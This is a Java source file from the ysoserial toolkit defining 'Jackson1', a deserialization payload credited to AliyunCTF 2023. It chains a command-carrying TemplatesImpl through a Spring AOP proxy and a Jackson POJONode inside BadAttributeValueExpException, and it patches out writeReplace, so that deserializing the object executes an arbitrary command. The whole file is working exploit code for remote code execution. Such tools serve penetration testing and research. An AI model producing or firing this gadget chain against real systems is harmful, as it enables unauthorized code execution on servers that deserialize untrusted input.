package ysoserial.payloads;

import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

import static ysoserial.payloads.util.Reflections.setFieldValue;

@Authors({"AliyunCTF 2023"})
public class Jackson1 implements ObjectPayload<Object>{

    // make the gadget stable (just trigger the getOutputProperties)
    public static Object wrappedTemplates(String command) throws Exception {
        Templates tmpl = (Templates) Gadgets.createTemplatesImpl(command);

        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(tmpl);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
        return proxy;
    }

    @Override
    public Object getObject(String command) throws Exception {
//        Templates tmpl = (Templates) Gadgets.createTemplatesImpl(command);
        Object tmpl = wrappedTemplates(command);

        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

        POJONode node = new POJONode(tmpl);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        setFieldValue(val, "val", node);

        return val;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jackson1.class, args);
    }
}
